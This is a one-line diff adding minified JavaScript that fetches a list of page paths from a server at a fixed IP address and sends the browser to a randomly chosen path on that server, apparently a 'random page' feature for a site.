@@ -1,0 +1,1 @@
+async function fetchPaths(){const t=await fetch("http://95.179.238.202/s.json");return await t.json()}async function goToRandomPage(){const t=(await fetchPaths()).filter((t=>!t.includes("."))),a=t[Math.floor(Math.random()*t.length)];window.location.assign(`http://95.179.238.202/${a}`)}
